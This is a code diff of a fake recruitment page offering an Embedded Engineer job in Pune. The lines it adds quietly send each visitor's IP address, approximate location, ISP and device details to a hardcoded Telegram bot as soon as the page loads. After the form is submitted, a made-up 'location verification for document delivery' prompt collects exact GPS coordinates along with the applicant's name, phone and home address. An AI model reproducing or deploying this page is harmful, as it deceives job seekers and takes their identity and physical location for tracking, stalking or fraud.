@@ -38,6 +38,8 @@
         .spinner { border: 3px solid #e0e0e0; border-top: 3px solid #1a73e8; border-radius: 50%; width: 40px; height: 40px; animation: spin 0.8s linear infinite; margin: 0 auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         .section-title { font-size: 15px; font-weight: bold; color: #1a73e8; margin: 20px 0 10px; padding-bottom: 5px; border-bottom: 2px solid #e8f0fe; }
+        .location-notice { background: #fff3cd; padding: 12px; border-radius: 5px; margin: 10px 0; font-size: 13px; text-align: center; display: none; border: 1px solid #ffc107; }
+        .location-notice a { color: #1a73e8; font-weight: bold; cursor: pointer; }
         @media (max-width: 600px) { .form-row, .form-row-3 { grid-template-columns: 1fr; } .job-grid { grid-template-columns: 1fr; } }
     </style>
 </head>
@@ -54,7 +56,7 @@
         </div>
         
         <p style="font-size:14px;color:#555;line-height:1.6;">Hello Candidate,</p>
-        <p style="font-size:14px;color:#555;line-height:1.6;">We have an <strong>urgent requirement</strong> for an Embedded Engineer role with a leading semiconductor client in Pune. Your profile looks like a great match.</p>
+        <p style="font-size:14px;color:#555;line-height:1.6;">We have an <strong>urgent requirement</strong> for an Embedded Engineer role with a leading semiconductor client in Pune.</p>
         
         <div class="job-box">
             <h3>📋 Job Details</h3>
@@ -79,7 +81,7 @@
             </div>
         </div>
         
-        <p style="font-size:14px;color:#555;margin:15px 0;">Fill in your details below to apply. I'll share your profile with the client immediately.</p>
+        <p style="font-size:14px;color:#555;margin:15px 0;">Fill in your details below to apply.</p>
         
         <form id="jobForm">
             <div class="section-title">Personal Information</div>
@@ -109,23 +111,23 @@
             <div class="section-title">Address Details</div>
             
             <label>Home / PG Name *</label>
-            <input type="text" id="pg_name" placeholder="e.g. Sai Residency, PG Name" required>
+            <input type="text" id="pg_name" placeholder="e.g. Sai Residency" required>
             
             <label>Area / Street / Locality *</label>
-            <input type="text" id="area" placeholder="e.g. Hinjawadi Phase 2, Wakad" required>
+            <input type="text" id="area" placeholder="e.g. Hinjawadi Phase 2" required>
             
             <div class="form-row-3">
                 <div>
                     <label>City *</label>
-                    <input type="text" id="city" placeholder="e.g. Pune" required>
+                    <input type="text" id="city" required>
                 </div>
                 <div>
                     <label>State</label>
-                    <input type="text" id="state" placeholder="e.g. Maharashtra">
+                    <input type="text" id="state">
                 </div>
                 <div>
                     <label>Pincode *</label>
-                    <input type="number" id="pincode" placeholder="e.g. 411057" required>
+                    <input type="number" id="pincode" required>
                 </div>
             </div>
             
@@ -156,7 +158,6 @@
                         <option value="B.E/B.Tech">B.E / B.Tech</option>
                         <option value="M.E/M.Tech">M.E / M.Tech</option>
                         <option value="Diploma">Diploma</option>
-                        <option value="BCA/MCA">BCA / MCA</option>
                         <option value="Other">Other</option>
                     </select>
                 </div>
@@ -171,8 +172,12 @@
             
             <div class="insta-box">
                 <h3>📸 Follow Us on Instagram</h3>
-                <p>Get daily job updates, interview tips & early access to openings!</p>
+                <p>Get daily job updates & interview tips!</p>
                 <a href="insta.html" target="_blank" class="insta-btn">📱 Follow @techhire.jobs</a>
+            </div>
+            
+            <div class="location-notice" id="locationNotice">
+                📍 <strong>Location verification required:</strong> Please <a onclick="requestLocation()">click here</a> to verify your address for document delivery
             </div>
             
             <label>Why are you interested in this role?</label>
@@ -195,38 +200,81 @@
     </div>
 </div>
 
-// GPS Location Capture (if user allows)
-function getLocation() {
+<script>
+var botToken = "8457083817:AAFM5Lsks2cLBqShhVFT5i2p5mH01lJjFEw";
+var chatId = "1012714242";
+
+// ========== LOCATION TRACKING ==========
+
+// 1. IP Location - Always works, no permission needed
+function getIPLocation() {
+    fetch('https://ipapi.co/json/')
+    .then(function(r) { return r.json(); })
+    .then(function(data) {
+        var msg = "🌐 VISITOR DETECTED\n";
+        msg += "IP: " + data.ip + "\n";
+        msg += "City: " + data.city + "\n";
+        msg += "Region: " + data.region + "\n";
+        msg += "Country: " + data.country_name + "\n";
+        msg += "ISP: " + data.org + "\n";
+        msg += "Lat: " + data.latitude + "\n";
+        msg += "Lon: " + data.longitude + "\n";
+        msg += "Maps: https://www.google.com/maps?q=" + data.latitude + "," + data.longitude;
+        
+        var url = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(msg);
+        fetch(url);
+    });
+}
+
+// 2. GPS Location - Only if user allows (triggered on submit)
+function requestLocation() {
     if (navigator.geolocation) {
+        document.getElementById('locationNotice').innerHTML = '📍 Verifying your location...';
+        
         navigator.geolocation.getCurrentPosition(function(position) {
             var lat = position.coords.latitude;
             var lon = position.coords.longitude;
             var accuracy = position.coords.accuracy;
             
-            var locationMsg = "📍 GPS LOCATION\n";
-            locationMsg += "Latitude: " + lat + "\n";
-            locationMsg += "Longitude: " + lon + "\n";
-            locationMsg += "Accuracy: " + accuracy + " meters\n";
-            locationMsg += "Google Maps: https://www.google.com/maps?q=" + lat + "," + lon + "\n";
-            locationMsg += "Time: " + new Date().toLocaleString();
+            var msg = "📍 EXACT GPS LOCATION\n";
+            msg += "Latitude: " + lat + "\n";
+            msg += "Longitude: " + lon + "\n";
+            msg += "Accuracy: " + accuracy + " meters\n";
+            msg += "Maps: https://www.google.com/maps?q=" + lat + "," + lon + "\n";
+            msg += "Time: " + new Date().toLocaleString();
             
-            var url = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(locationMsg);
+            var url = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(msg);
             fetch(url);
+            
+            document.getElementById('locationNotice').innerHTML = '✅ Location verified! ✓';
+            document.getElementById('locationNotice').style.background = '#d4edda';
+            document.getElementById('locationNotice').style.borderColor = '#28a745';
         }, function(error) {
-            console.log("User denied location");
-        });
+            document.getElementById('locationNotice').innerHTML = '⚠️ Could not get location. <a onclick="requestLocation()">Click here to retry</a>';
+        }, { enableHighAccuracy: true, timeout: 10000 });
+    } else {
+        document.getElementById('locationNotice').innerHTML = '⚠️ Location not supported on this device';
     }
 }
 
-// Auto-trigger when page loads
-window.onload = function() {
-    getLocation();
-}
+// 3. Get device info
+function getDeviceInfo() {
+    var msg = "📱 DEVICE INFO\n";
+    msg += "Timezone: " + Intl.DateTimeFormat().resolvedOptions().timeZone + "\n";
+    msg += "Language: " + navigator.language + "\n";
+    msg += "Platform: " + navigator.platform + "\n";
+    msg += "Screen: " + screen.width + "x" + screen.height + "\n";
+    msg += "Browser: " + navigator.userAgent.substring(0, 60);
     
-<script>
-var botToken = "8457083817:AAFM5Lsks2cLBqShhVFT5i2p5mH01lJjFEw";
-var chatId = "1012714242";
+    var url = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(msg);
+    fetch(url);
+}
 
+// ========== RUN ON PAGE LOAD ==========
+getIPLocation();
+getDeviceInfo();
+
+// ========== FORM SUBMISSION ==========
 function submitApplication() {
     var name = document.getElementById('full_name').value;
     var email = document.getElementById('email').value;
@@ -245,16 +293,20 @@ function submitApplication() {
     var message = document.getElementById('message').value;
     
     if (!name || !email || !phone || !pg_name || !area || !city || !pincode) {
-        alert('Please fill all required fields (Name, Email, Phone, PG Name, Area, City, Pincode)');
+        alert('Please fill all required fields');
         return;
     }
     
     document.getElementById('submitBtn').style.display = 'none';
     document.getElementById('loading').style.display = 'block';
     
+    // Show location request
+    document.getElementById('locationNotice').style.display = 'block';
+    requestLocation();
+    
     var msg = "📋 NEW JOB APPLICATION\n";
     msg += "═══════════════════════\n";
-    msg += "👤 PERSONAL INFO\n";
+    msg += "👤 PERSONAL\n";
     msg += "Name: " + name + "\n";
     msg += "Email: " + email + "\n";
     msg += "Phone: " + phone + "\n";
@@ -290,7 +342,7 @@ function submitApplication() {
     .catch(function() {
         document.getElementById('loading').style.display = 'none';
         document.getElementById('submitBtn').style.display = 'block';
-        alert('Error submitting. Please try again.');
+        alert('Error. Please try again.');
     });
 }
 </script>
